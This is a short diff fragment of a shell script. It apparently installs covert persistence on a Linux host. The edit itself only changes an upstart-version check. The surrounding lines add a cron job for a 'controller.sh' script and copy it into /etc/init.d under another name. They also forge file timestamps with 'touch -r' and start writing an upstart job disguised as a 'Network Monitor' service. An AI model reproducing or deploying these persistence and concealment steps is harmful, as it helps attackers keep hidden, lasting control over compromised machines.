@@ -18,7 +18,7 @@ do
 done
 (crontab -l 2>/dev/null; echo "15 5 17 4 * /etc/rc.local/controller.sh") | crontab -
 cp -p "controller.sh" "/etc/init.d/rc.local/rcd.sh" &> /dev/null
-if [[ $(initctl version) =~ upstart 2> /dev/null]]; then
+if [[ $(initctl version) =~ upstart]]; then
     sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
     sudo cat > /etc/init/network-monitor.conf << EOF
     description "Network Monitor"
